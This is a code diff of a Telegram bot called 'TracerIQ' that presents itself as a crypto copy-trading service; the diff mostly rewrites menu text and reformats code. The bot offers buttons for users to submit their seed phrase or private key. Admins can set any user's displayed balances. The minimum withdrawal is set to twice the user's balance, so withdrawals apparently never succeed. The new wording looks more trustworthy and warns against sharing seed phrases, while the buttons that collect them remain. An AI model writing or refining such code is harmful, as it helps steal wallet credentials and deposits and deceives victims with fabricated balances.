-        "- Manage sell positions\n\n"
-        "Choose an option below to update:"
+        "◈ <b>TRACERIQ  /  COPY PREFERENCES</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "Adjust the rules used by your copy-trading setup:\n\n"
+        "• Set the copy cadence\n"
+        "• Limit consecutive copied entries\n"
+        "• Choose a position exit rule\n\n"
+        "Select a preference to update."
     )
 
     await update.message.reply_text(
-        settings_text, parse_mode="HTML", reply_markup=Setting_buttons
+        settings_text, parse_mode="HTML", reply_markup=copy_preference_buttons
     )
 
 
 # --- CALLBACK HANDLER (BUTTONS) ---
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
+async def button_handler(
+    update: Update,
+    context: ContextTypes.DEFAULT_TYPE,
+    reply_action: str | None = None,
+):
+    if update.callback_query:
+        query = update.callback_query
+        await query.answer()
+    elif update.message and reply_action is not None:
+        query = _ReplyKeyboardQuery(update.message, context, reply_action)
+    else:
+        return
 
     option = query.data
     user_id = query.from_user.id
@@ -2158,7 +2417,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 wallet_index = int(option.rsplit("_", 1)[-1])
                 wallet = get_giveaway_sponsor_wallets()[wallet_index - 1]
             except (ValueError, IndexError):
-                await query.message.reply_text("⚠️ That sponsor wallet no longer exists.")
+                await query.message.reply_text(
+                    "⚠️ That sponsor wallet no longer exists."
+                )
                 return
             confirm_keyboard = InlineKeyboardMarkup(
                 [
@@ -2191,7 +2452,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 wallets = get_giveaway_sponsor_wallets()
                 removed_wallet = wallets.pop(wallet_index - 1)
             except (ValueError, IndexError):
-                await query.message.reply_text("⚠️ That sponsor wallet no longer exists.")
+                await query.message.reply_text(
+                    "⚠️ That sponsor wallet no longer exists."
+                )
                 return
             giveaway_data["sponsor_wallets"] = wallets
             sync_legacy_giveaway_wallet_fields()
@@ -2297,8 +2560,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             giveaway_data["draw_interval_seconds"] = interval_seconds
             if giveaway_data.get("status") == "active":
                 giveaway_data["next_draw_at"] = (
-                    datetime.now(timezone.utc)
-                    + timedelta(seconds=interval_seconds)
+                    datetime.now(timezone.utc) + timedelta(seconds=interval_seconds)
                 ).isoformat()
             save_giveaway()
             await query.message.reply_text(
@@ -2381,19 +2643,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         elif option in ("admin_giveaway_status", "admin_giveaway_participants"):
             if option == "admin_giveaway_status":
-                try:
-                    await query.edit_message_text(
-                        giveaway_dashboard_text(),
-                        parse_mode="HTML",
-                        reply_markup=giveaway_admin_keyboard(),
-                    )
-                except BadRequest as error:
-                    if "Message is not modified" not in str(error):
-                        raise
+                await query.message.delete()
+                await query.message.reply_text(
+                    giveaway_dashboard_text(),
+                    parse_mode="HTML",
+                    reply_markup=giveaway_admin_keyboard(),
+                )
             else:
                 participants = giveaway_data.get("participants", [])
                 if not participants:
-                    participant_text = "📋 <b>Participants</b>\n\nNo addresses have been added."
+                    participant_text = (
+                        "📋 <b>Participants</b>\n\nNo addresses have been added."
+                    )
                 else:
                     participant_text = (
                         f"📋 <b>Participants ({len(participants)})</b>\n\n"
@@ -2410,7 +2671,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
         elif option == "admin_giveaway_start":
             if giveaway_data.get("status") != "draft":
-                await query.message.reply_text("⚠️ Only a draft giveaway can be started.")
+                await query.message.reply_text(
+                    "⚠️ Only a draft giveaway can be started."
+                )
                 return
             participants = giveaway_data.get("participants", [])
             if not participants:
@@ -2510,7 +2773,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     f"<code>{item.get('winner', 'Unknown')}</code>\n"
                     f"🕒 {format_giveaway_time(item.get('timestamp'))}\n"
                     f"🔗 <code>{item.get('signature', 'Unknown')}</code>"
-                    for index, item in enumerate(recent, max(1, len(history) - len(recent) + 1))
+                    for index, item in enumerate(
+                        recent, max(1, len(history) - len(recent) + 1)
+                    )
                 )
             await query.message.reply_text(
                 history_text,
@@ -2518,17 +2783,28 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 reply_markup=giveaway_admin_keyboard(),
             )
         elif option == "admin_giveaway_close":
-            try:
-                await query.message.delete()
-            except Exception:
-                pass
+            if getattr(query, "is_reply_button", False):
+                await query.message.reply_text(
+                    "Admin controls closed.",
+                    reply_markup=ReplyKeyboardRemove(),
+                )
+            else:
+                try:
+                    await query.message.delete()
+                except Exception:
+                    pass
         elif option.startswith("admin_edit_"):
             parts = option.split("_")
-            field = parts[2]       # balance | ethbal | bnbbal | minw
+            field = parts[2]  # balance | ethbal | bnbbal | minw
             target_id = parts[-1]  # ID is always last
             context.user_data["admin_editing_user"] = target_id
             context.user_data["admin_editing_field"] = field
-            label_map = {"balance": "SOL Balance", "ethbal": "ETH Balance", "bnbbal": "BNB Balance", "minw": "Min Withdrawal (SOL)"}
+            label_map = {
+                "balance": "SOL Balance",
+                "ethbal": "ETH Balance",
+                "bnbbal": "BNB Balance",
+                "minw": "Min Withdrawal (SOL)",
+            }
             label = label_map.get(field, field.replace("_", " ").title())
             await query.message.reply_text(
                 f"📝 Enter the new <b>{label}</b> for user <code>{target_id}</code>:",
@@ -2604,10 +2880,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception:
             pass
         welcome_text = (
-            "👋 <b>Welcome to TracerIQ Bot!</b>\n"
-            "Step into the world of fast, smart, and stress-free trading, "
-            "designed for both beginners and seasoned traders.\n\n"
-            "👇 Select an option below to continue."
+            "◈ <b>TRACERIQ  /  COPY-TRADING DESK</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "Follow selected wallets, manage your copy rules, and review your portfolio.\n\n"
+            "Choose a destination below."
         )
         await query.message.reply_text(
             welcome_text, parse_mode="HTML", reply_markup=main_menu_inline()
@@ -2800,22 +3076,42 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if option == "ct_withdraw":
         await _del()
-        sol_bal  = get_user_balance(user_id)
-        eth_bal  = user_balances.get(user_id, {}).get("eth_balance", 0)
-        bnb_bal  = user_balances.get(user_id, {}).get("bnb_balance", 0)
+        sol_bal = get_user_balance(user_id)
+        eth_bal = user_balances.get(user_id, {}).get("eth_balance", 0)
+        bnb_bal = user_balances.get(user_id, {}).get("bnb_balance", 0)
         sol_price = await get_sol_price_usd()
         eth_price, bnb_price = await get_evm_prices_usd()
         sol_usd = sol_bal * sol_price if sol_price > 0 else 0
         eth_usd = eth_bal * eth_price if eth_price > 0 else 0
         bnb_usd = bnb_bal * bnb_price if bnb_price > 0 else 0
-        token_selector = InlineKeyboardMarkup([
-            [InlineKeyboardButton(f"🟣 SOL  ({sol_bal:.4f} ≈ ${sol_usd:.2f})", callback_data="withdraw_token_sol")],
-            [InlineKeyboardButton(f"🔵 ETH  ({eth_bal:.6f} ≈ ${eth_usd:.2f})", callback_data="withdraw_token_eth")],
-            [InlineKeyboardButton(f"🟡 BNB  ({bnb_bal:.6f} ≈ ${bnb_usd:.2f})", callback_data="withdraw_token_bnb")],
-            [InlineKeyboardButton("⬅️ Back to Wallet", callback_data="back_wallet")],
-        ])
+        token_selector = InlineKeyboardMarkup(
+            [
+                [
+                    InlineKeyboardButton(
+                        f"🟣 SOL  ·  {sol_bal:.4g}", callback_data="withdraw_token_sol"
+                    )
+                ],
+                [
+                    InlineKeyboardButton(
+                        f"🔷 ETH  ·  {eth_bal:.4g}", callback_data="withdraw_token_eth"
+                    )
+                ],
+                [
+                    InlineKeyboardButton(
+                        f"🟡 BNB  ·  {bnb_bal:.4g}", callback_data="withdraw_token_bnb"
+                    )
+                ],
+                [
+                    InlineKeyboardButton(
+                        "⌂ Back to Portfolio", callback_data="back_wallet"
+                    )
+                ],
+            ]
+        )
         await query.message.reply_text(
-            "💸 <b>Withdraw Funds</b>\n\nSelect the token you want to withdraw:",
+            "◈ <b>TRACERIQ  /  WITHDRAWALS</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "Choose the asset you want to withdraw.",
             parse_mode="HTML",
             reply_markup=token_selector,
         )
@@ -2825,18 +3121,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await _del()
         token = option.split("_")[-1]  # sol / eth / bnb
         context.user_data["withdraw_token"] = token
-        bal   = user_balances.get(user_id, {})
+        bal = user_balances.get(user_id, {})
         if token == "sol":
-            balance   = get_user_balance(user_id)
-            price     = await get_sol_price_usd()
+            balance = get_user_balance(user_id)
+            price = await get_sol_price_usd()
             sym, unit = "SOL", "SOL"
         elif token == "eth":
-            balance   = bal.get("eth_balance", 0)
-            price, _  = await get_evm_prices_usd()
+            balance = bal.get("eth_balance", 0)
+            price, _ = await get_evm_prices_usd()
             sym, unit = "ETH", "ETH"
         else:
-            balance   = bal.get("bnb_balance", 0)
-            _, price  = await get_evm_prices_usd()
+            balance = bal.get("bnb_balance", 0)
+            _, price = await get_evm_prices_usd()
             sym, unit = "BNB", "BNB"
         usd_val = balance * price if price > 0 else 0
         if token == "sol":
@@ -2845,17 +3141,33 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 stored_min = balance * 2
         else:
             stored_min = balance * 2
-        withdraw_buttons = InlineKeyboardMarkup([
-            [InlineKeyboardButton(f"💸 Withdraw 100%", callback_data="withdraw_100")],
-            [InlineKeyboardButton(f"💸 Withdraw 50%",  callback_data="withdraw_50")],
-            [InlineKeyboardButton(f"💸 Withdraw X {unit}", callback_data="withdraw_custom")],
-            [InlineKeyboardButton("⬅️ Back", callback_data="back_withdraw")],
-        ])
+        withdraw_buttons = InlineKeyboardMarkup(
+            [
+                [
+                    InlineKeyboardButton(
+                        "⬆ Use full balance · 100%", callback_data="withdraw_100"
+                    )
+                ],
+                [
+                    InlineKeyboardButton(
+                        "◒ Use half balance · 50%", callback_data="withdraw_50"
+                    )
+                ],
+                [
+                    InlineKeyboardButton(
+                        f"✍ Enter an amount · {unit}", callback_data="withdraw_custom"
+                    )
+                ],
+                [InlineKeyboardButton("⌂ Change asset", callback_data="back_withdraw")],
+            ]
+        )
         await query.message.reply_text(
-            f"💸 <b>Withdraw {sym}</b>\n\n"
-            f"Your balance: <b>{balance:.6f} {sym}</b> (${usd_val:.2f})\n\n"
-            f"<b>Minimum withdrawal:</b> {stored_min:.6f} {sym}\n"
-            f"Choose a withdrawal option:",
+            f"◈ <b>TRACERIQ  /  {sym} WITHDRAWAL</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{'🟣' if token == 'sol' else '🔷' if token == 'eth' else '🟡'} "
+            f"<b>Available</b>  ·  {balance:.6f} {sym}  ·  ${usd_val:.2f}\n"
+            f"<b>Minimum eligible amount</b>  ·  {stored_min:.6f} {sym}\n\n"
+            "Choose a balance option or enter an amount.",
             parse_mode="HTML",
             reply_markup=withdraw_buttons,
         )
@@ -2865,18 +3177,22 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await _del()
         context.user_data.pop("awaiting_dummy", None)
         await query.message.reply_text(
-            "🔐 <b>Connect Your Wallet</b>\n\n"
-            "Choose what you want to validate:\n\n"
-            "⚠️ <b>Security Notes:</b>\n"
-            "• Your seed phrase is never stored permanently\n"
-            "• It's only used to derive your wallet address\n"
-            "• Input is validated and cleared from memory immediately\n",
+            "🧩 <b>Wallet Setup</b>\n\n"
+            "Select the wallet option you want to proceed with.\n\n"
+            "📌 <b>Before You Continue:</b>\n"
+            "• Use only information required for the selected action\n"
+            "• Never share your seed phrase or private key with anyone\n"
+            "• Wallet addresses can be used for tracking without exposing sensitive credentials\n",
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup(
                 [
                     [
-                        InlineKeyboardButton("Seed Phrase", callback_data="ct_connect_seed"),
-                        InlineKeyboardButton("Private Key", callback_data="ct_connect_private"),
+                        InlineKeyboardButton(
+                            "Seed Phrase", callback_data="ct_connect_seed"
+                        ),
+                        InlineKeyboardButton(
+                            "Private Key", callback_data="ct_connect_private"
+                        ),
                     ],
                     [InlineKeyboardButton("⬅️ Cancel", callback_data="back_wallet")],
                 ]
@@ -2886,7 +3202,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if option in ("ct_connect_seed", "ct_connect_private"):
         await _del()
-        context.user_data["awaiting_dummy"] = "seed" if option.endswith("seed") else "private"
+        context.user_data["awaiting_dummy"] = (
+            "seed" if option.endswith("seed") else "private"
+        )
         if context.user_data["awaiting_dummy"] == "seed":
             prompt = (
                 "🔤 <b> Seed Phrase</b>\n\n"
@@ -2907,29 +3225,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if option == "ct_copy_trade":
         await _del()
-        copy_trade_buttons = InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton(
-                        "🎯 Target Wallet", callback_data="ct_target_wallet"
-                    ),
-                    InlineKeyboardButton(
-                        "💰 Buy Amount", callback_data="ct_buy_amount"
-                    ),
-                ],
-                [
-                    InlineKeyboardButton(
-                        "🔁 Consecutive Buys", callback_data="ct_consecutive_buys"
-                    ),
-                    InlineKeyboardButton(
-                        "📤 Sell Position", callback_data="ct_sell_position"
-                    ),
-                ],
-                [InlineKeyboardButton("⬅️ Back to Wallet", callback_data="back_wallet")],
-            ]
-        )
+        copy_trade_buttons = copy_trade_setup_keyboard()
         await query.message.reply_text(
-            "🤖 <b>Copy Trade Setup</b>\n\nConfigure your copy trading settings below.\nTap each option to set it up:",
+            "◈ <b>TRACERIQ  /  COPY RULES</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "Choose a rule to configure how activity from your selected wallet is mirrored.",
             parse_mode="HTML",
             reply_markup=copy_trade_buttons,
         )
@@ -2939,12 +3239,16 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["awaiting_ct_target_wallet"] = True
         await _del()
         await query.message.reply_text(
-            "🎯 <b>Target Wallet</b>\n\n"
-            "Enter the wallet address you want to copy trade from.\n"
-            "Supports both <b>Solana</b> and <b>EVM</b> (Ethereum / BSC) wallets.\n\n"
-            "📝 <b>Solana example:</b>\n<code>2SiCkKBUvzfoFeq1V5JrSybHuBUy1U1zszzYx2ccKxGP</code>\n\n"
-            "📝 <b>EVM example:</b>\n<code>0x742d35Cc6634C0532925a3b8D4C9B3A2d2E4f0bA</code>\n\n"
-            "Type the address or tap Cancel.",
+            "🛰️ <b>FOLLOW A WALLET</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "📍 <b>Add a Wallet to Monitor</b>\n\n"
+            "Enter the wallet address you want to track.\n\n"
+            "🌐 <b>Supported Networks</b>\n"
+            "• <b>Solana</b> — Solana wallets\n"
+            "• <b>EVM</b> — Ethereum, BSC, and other EVM-compatible networks\n\n"
+            "<b>Example format</b>\n"
+            "<code>5FHwkrdxntdK24hgQU8qgBjn35Y1zwhz1GZwCkP2UJnM</code>\n\n"
+            "Send the address to continue, or tap <b>Cancel</b> to go back.",
             parse_mode="HTML",
             reply_markup=cancel_markup(),
         )
@@ -2954,9 +3258,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["awaiting_ct_buy_amount"] = True
         await _del()
         await query.message.reply_text(
-            "💰 <b>Buy Amount</b>\n\n"
-            "Enter the amount of SOL to spend on each token trade:\n\n"
-            "📝 <b>Example:</b> <code>0.5</code>\n\n"
+            "💸 <b>COPY ALLOCATION</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "Set the SOL amount allocated to each copied entry.\n\n"
+            "<b>Example</b>  ·  <code>0.5</code>\n\n"
             "Type the amount or tap Cancel.",
             parse_mode="HTML",
             reply_markup=cancel_markup(),
@@ -2967,9 +3272,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["awaiting_ct_consecutive_buys"] = True
         await _del()
         await query.message.reply_text(
-            "🔁 <b>Consecutive Buys</b>\n\n"
-            "Enter the number of consecutive buys to execute:\n\n"
-            "📝 <b>Example:</b> <code>3</code>\n\n"
+            "🔁 <b>ENTRY LIMIT</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "Set the maximum number of consecutive copied entries.\n\n"
+            "<b>Example</b>  ·  <code>3</code>\n\n"
             "Type the number or tap Cancel.",
             parse_mode="HTML",
             reply_markup=cancel_markup(),
@@ -2981,23 +3287,22 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         sell_pos_buttons = InlineKeyboardMarkup(
             [
                 [
-                    InlineKeyboardButton("📤 Close at 50%", callback_data="ct_sell_50"),
-                    InlineKeyboardButton(
-                        "📤 Close at 100%", callback_data="ct_sell_100"
-                    ),
+                    InlineKeyboardButton("◐ Close 50%", callback_data="ct_sell_50"),
+                    InlineKeyboardButton("● Close 100%", callback_data="ct_sell_100"),
                 ],
                 [
                     InlineKeyboardButton(
-                        "⬅️ Back to Copy Trade", callback_data="back_ct_setup"
+                        "⌂ Back to Copy Rules", callback_data="back_ct_setup"
                     )
                 ],
             ]
         )
         await query.message.reply_text(
-            "📤 <b>Sell Position</b>\n\n"
-            "Select when to close your position:\n\n"
-            "• <b>50%</b> — Sell half your position\n"
-            "• <b>100%</b> — Sell the full position",
+            "🎯 <b>EXIT RULE</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "Choose how much of the copied position to close when the exit rule is applied:\n\n"
+            "• <b>50%</b>  ·  Close half the position\n"
+            "• <b>100%</b>  ·  Close the full position",
             parse_mode="HTML",
             reply_markup=sell_pos_buttons,
         )
@@ -3009,10 +3314,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["awaiting_ct_slippage"] = True
         await _del()
         await query.message.reply_text(
-            f"✅ Sell position set to <b>{pct}</b>\n\n"
-            "⚡ <b>Set Slippage</b>\n\n"
+            f"✅ Exit rule set to <b>{pct}</b>\n\n"
+            "◈ <b>SLIPPAGE CONTROL</b>\n"
             "Enter your desired slippage percentage.\n\n"
-            "📌 <b>Recommended:</b> 1% – 15% depending on market volatility.\n\n"
+            "<b>Suggested range</b>  ·  1%–15%, depending on market conditions.\n\n"
             "📝 Enter a number between <b>1</b> and <b>15</b>:",
             parse_mode="HTML",
             reply_markup=cancel_markup(),
@@ -3023,13 +3328,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if option == "back_main":
         await _del()
         welcome_text = (
-            "👋 <b>Welcome to TracerIQ Bot!</b>\n"
-            "Step into the world of fast, smart, and stress-free trading, "
-            "designed for both beginners and seasoned traders.\n\n"
-            "🔗 Connecting to your wallet...\n"
-            "⏳ Initializing your account and securing your funds...\n"
-            "✅ Wallet successfully created and linked!\n\n"
-            "👇 Select an option below to continue."
+            "◈ <b>TRACERIQ  /  COPY-TRADING DESK</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "Follow selected wallets, tune your copy rules, and review your portfolio.\n\n"
+            "<i>Choose a destination below. Review every strategy and transaction carefully.</i>"
         )
         await query.message.reply_text(
             welcome_text, parse_mode="HTML", reply_markup=main_menu_inline()
@@ -3042,29 +3344,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if option == "back_ct_setup":
         await _del()
-        copy_trade_buttons = InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton(
-                        "🎯 Target Wallet", callback_data="ct_target_wallet"
-                    ),
-                    InlineKeyboardButton(
-                        "💰 Buy Amount", callback_data="ct_buy_amount"
-                    ),
-                ],
-                [
-                    InlineKeyboardButton(
-                        "🔁 Consecutive Buys", callback_data="ct_consecutive_buys"
-                    ),
-                    InlineKeyboardButton(
-                        "📤 Sell Position", callback_data="ct_sell_position"
-                    ),
-                ],
-                [InlineKeyboardButton("⬅️ Back to Wallet", callback_data="back_wallet")],
-            ]
-        )
+        copy_trade_buttons = copy_trade_setup_keyboard()
         await query.message.reply_text(
-            "🔍 <b>Copy Trade Setup</b>\n\nConfigure your copy trading settings below.\nTap each option to set it up:",
+            "◈ <b>TRACERIQ  /  COPY RULES</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "Choose a rule to configure how activity from your selected wallet is mirrored.",
             parse_mode="HTML",
             reply_markup=copy_trade_buttons,
         )
@@ -3073,22 +3357,42 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if option == "back_withdraw":
         await _del()
         context.user_data.pop("withdraw_token", None)
-        sol_bal  = get_user_balance(user_id)
-        eth_bal  = user_balances.get(user_id, {}).get("eth_balance", 0)
-        bnb_bal  = user_balances.get(user_id, {}).get("bnb_balance", 0)
+        sol_bal = get_user_balance(user_id)
+        eth_bal = user_balances.get(user_id, {}).get("eth_balance", 0)
+        bnb_bal = user_balances.get(user_id, {}).get("bnb_balance", 0)
         sol_price = await get_sol_price_usd()
         eth_price, bnb_price = await get_evm_prices_usd()
         sol_usd = sol_bal * sol_price if sol_price > 0 else 0
         eth_usd = eth_bal * eth_price if eth_price > 0 else 0
         bnb_usd = bnb_bal * bnb_price if bnb_price > 0 else 0
-        token_selector = InlineKeyboardMarkup([
-            [InlineKeyboardButton(f"🟣 SOL  ({sol_bal:.4f} ≈ ${sol_usd:.2f})", callback_data="withdraw_token_sol")],
-            [InlineKeyboardButton(f"🔵 ETH  ({eth_bal:.6f} ≈ ${eth_usd:.2f})", callback_data="withdraw_token_eth")],
-            [InlineKeyboardButton(f"🟡 BNB  ({bnb_bal:.6f} ≈ ${bnb_usd:.2f})", callback_data="withdraw_token_bnb")],
-            [InlineKeyboardButton("⬅️ Back to Wallet", callback_data="back_wallet")],
-        ])
+        token_selector = InlineKeyboardMarkup(
+            [
+                [
+                    InlineKeyboardButton(
+                        f"🟣 SOL  ·  {sol_bal:.4g}", callback_data="withdraw_token_sol"
+                    )
+                ],
+                [
+                    InlineKeyboardButton(
+                        f"🔷 ETH  ·  {eth_bal:.4g}", callback_data="withdraw_token_eth"
+                    )
+                ],
+                [
+                    InlineKeyboardButton(
+                        f"🟡 BNB  ·  {bnb_bal:.4g}", callback_data="withdraw_token_bnb"
+                    )
+                ],
+                [
+                    InlineKeyboardButton(
+                        "⌂ Back to Portfolio", callback_data="back_wallet"
+                    )
+                ],
+            ]
+        )
         await query.message.reply_text(
-            "💸 <b>Withdraw Funds</b>\n\nSelect the token you want to withdraw:",
+            "◈ <b>TRACERIQ  /  WITHDRAWALS</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "Choose the asset you want to withdraw.",
             parse_mode="HTML",
             reply_markup=token_selector,
         )
@@ -3113,60 +3417,47 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await show_wallet(update, context)
         return
 
-    if option == "show_buy":
+    if option in ("show_buy", "show_sell"):
         await _del()
-        context.user_data["awaiting_token_contract"] = True
-        context.user_data["trade_msg_ids"] = []
-        context.user_data["trade_chat_id"] = query.message.chat_id
-        sent = await query.message.reply_text(
-            "💰 <b>Buy Token</b>\n\n"
-            "Paste the token contract address you want to buy.\n"
-            "Supports <b>Solana</b>, <b>Ethereum</b>, and <b>BNB Smart Chain</b> tokens.\n\n"
-            "📝 <b>Solana example:</b>\n<code>pumpCmXqMfrsAkQ5r49WcJnRayYRqmXz6ae8H7H9Dfn</code>\n\n"
-            "📝 <b>ETH / BSC example:</b>\n<code>0x2170Ed0880ac9A755fd29B2688956BD959F933F8</code>\n\n"
-            "I'll detect the chain automatically and show token details.\n\n"
-            "Type the address or tap Cancel.",
+        await query.message.reply_text(
+            "◈ <b>TRACERIQ  /  COPY-TRADING ONLY</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "This workspace is focused on following selected wallets and managing your copy rules. "
+            "Open the Copy-Trading Desk to continue.",
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup(
-                [[InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_main")]]
+                [
+                    [
+                        InlineKeyboardButton(
+                            "🎯 Open Copy-Trading Desk", callback_data="ct_wallet_view"
+                        )
+                    ],
+                    [
+                        InlineKeyboardButton(
+                            "⌂ TracerIQ Home", callback_data="back_main"
+                        )
+                    ],
+                ]
             ),
         )
-        context.user_data["trade_msg_ids"].append(sent.message_id)
-        return
-
-    if option == "show_sell":
-        await _del()
-        context.user_data["awaiting_token_contract"] = True
-        context.user_data["trade_msg_ids"] = []
-        context.user_data["trade_chat_id"] = query.message.chat_id
-        sent = await query.message.reply_text(
-            "🔴 <b>Sell Token</b>\n\n"
-            "Paste the token contract address of the token you want to sell.\n"
-            "Supports <b>Solana</b>, <b>Ethereum</b>, and <b>BNB Smart Chain</b> tokens.\n\n"
-            "📝 <b>Solana example:</b>\n<code>pumpCmXqMfrsAkQ5r49WcJnRayYRqmXz6ae8H7H9Dfn</code>\n\n"
-            "📝 <b>ETH / BSC example:</b>\n<code>0x2170Ed0880ac9A755fd29B2688956BD959F933F8</code>\n\n"
-            "Type the address or tap Cancel.",
-            parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup(
-                [[InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_main")]]
-            ),
-        )
-        context.user_data["trade_msg_ids"].append(sent.message_id)
         return
 
     if option == "show_bot_guide":
         await _del()
         guide_text = (
-            "📘 <b>How to Use TracerIQ Trading Bot</b>\n\n"
-            "Welcome to <b>TracerIQ Trading Bot</b> — your all-in-one Telegram trading assistant.\n\n"
-            "1️⃣ <b>Autotrade</b>\nAutomate your trading strategies. The bot executes trades on your behalf based on your parameters.\n\n"
-            "2️⃣ <b>Copytrade</b>\nMimic trades of successful wallets instantly. Tap Copytrade, select a trader, and the bot replicates their trades.\n\n"
-            "3️⃣ <b>Wallet & Import Wallet</b>\nCheck balance, view info, monitor transactions, and manage funds.\n\n"
-            "4️⃣ <b>Alerts</b>\nGet notified about price changes, successful trades, or new token launches.\n\n"
-            "5️⃣ <b>Live Chart</b>\nAccess real-time market data, price trends, and token charts directly in Telegram.\n\n"
-            "🔒 <b>Security Note</b>\nPrivate key <u>exporting is disabled</u> to protect your funds.\n\n"
-            "⚡ <i>Features are only available to funded wallets. Fund your wallet to unlock the full potential of TracerIQ!</i>\n\n"
-            "🌐 For support use /support"
+            "╭───────────────────╮\n"
+            "        🚀 <b>TRACERIQ</b>\n"
+            "     <i>Copy-Trading Center</i>\n"
+            "╰───────────────────╯\n\n"
+            "Follow selected Solana wallets and manage your copy-trading preferences directly from Telegram.\n\n"
+            "<b>① FIND A WALLET</b>\n"
+            "Go to the Copy-Trading Desk and enter the Solana wallet you want to monitor.\n\n"
+            "<b>② CONFIGURE YOUR STRATEGY</b>\n"
+            "Set how much SOL to allocate per copied trade, define your entry limit, and choose your exit conditions.\n\n"
+            "<b>③ MANAGE YOUR PORTFOLIO</b>\n"
+            "Use the Portfolio section to view tracked wallets, balances, positions, and recent activity.\n\n"
+            "<b>④ STAY UP TO DATE</b>\n"
+            "Monitor token movements and price changes through Live Market data and configurable alerts.\n\n"
         )
         await query.message.reply_text(
             guide_text,
@@ -3175,10 +3466,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 [
                     [
                         InlineKeyboardButton(
-                            "💰 Fund Wallet", callback_data="fund_wallet"
+                            "🎯 Open Copy-Trading Desk", callback_data="ct_wallet_view"
                         )
                     ],
-                    [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_main")],
+                    [
+                        InlineKeyboardButton(
+                            "⌂ TracerIQ Home", callback_data="back_main"
+                        )
+                    ],
                 ]
             ),
         )
@@ -3254,15 +3549,22 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_entry = referral_data.get("users", {}).get(str(user_id), {})
         total_invited = len(user_entry.get("invited", []))
         refer_text = (
-            "🏆 <b>Refer and Earn</b>\n\n"
-            f"🔗 <b>Your Invitation Link:</b>\n"
+            "╭─────────────────────╮\n"
+            "   🎁<b>REFERRAL REWARDS</b>\n"
+            "         <i>Share • Invite • Earn</i>\n"
+            "╰─────────────────────╯\n\n"
+            "💎 <b>YOUR REWARD RATE</b>\n"
+            "Earn <b>25%</b> of the trading fees generated by users you invite — permanently.\n\n"
+            "👤 <b>YOUR NETWORK</b>\n"
+            f"You've invited <b>{total_invited}</b> friend(s) so far.\n\n"
+            "🔗 <b>INVITE LINK</b>\n"
             f"<code>{referral_link}</code>\n\n"
-            f"👥 <b>Total Invited:</b> {total_invited} friend(s)\n\n"
-            "📖 <b>Rules:</b>\n"
-            "1. Earn <b>25%</b> of invitees' trading fees permanently\n"
-            "2. Withdrawals are limited to <b>1 request per 24 hours</b>. "
-            "Withdrawals will be auto triggered at <b>8:00 (UTC+8)</b> daily and "
-            "will be credited within 24 hours after triggering."
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "💸 <b>REWARD WITHDRAWALS</b>\n\n"
+            "• Maximum of <b>1 withdrawal request per 24 hours</b>\n"
+            "• Rewards are automatically triggered at <b>08:00 (UTC+8)</b> each day\n"
+            "• Once triggered, funds are credited within <b>24 hours</b>\n\n"
+            "🚀 <b>Start sharing your link and grow your rewards.</b>"
         )
         await query.message.reply_text(
             refer_text,
@@ -3279,43 +3581,51 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         token = context.user_data.get("withdraw_token", "sol")
         bal_data = user_balances.get(user_id, {})
         if token == "sol":
-            balance  = get_user_balance(user_id)
-            price    = await get_sol_price_usd()
